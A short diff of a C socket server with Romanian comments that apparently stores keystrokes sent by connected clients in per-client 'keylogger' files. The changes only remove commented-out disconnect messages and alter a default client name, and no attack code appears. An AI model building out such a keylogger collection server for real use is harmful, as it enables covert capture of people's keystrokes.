@@ -62,12 +62,6 @@ void* handle_client(void* params) {
 
     }
 
-    // if (read_size == 0) {
-    //     printf("Clientul %d s-a deconectat.\n", args->client_sock);
-    // } else if (read_size == -1) {
-    //     perror("Eroare la primirea datelor");
-    // }
-
     // Curățare resurse
     if (clientHndler.clientsAttr[args->client_sock].keylogger_fd != -1) {
         close(clientHndler.clientsAttr[args->client_sock].keylogger_fd);
@@ -123,7 +117,7 @@ void sock_init(int *socket_desc, struct sockaddr_in* server)
 
 void setZeroClientHandler(clientAttributes_t* clientAttr)
 {
-    strcpy(clientAttr->name, "P");
+    strcpy(clientAttr->name, "");
     clientAttr->keylogger_fd = -1;
     clientAttr->recordKeys = 1;
 }
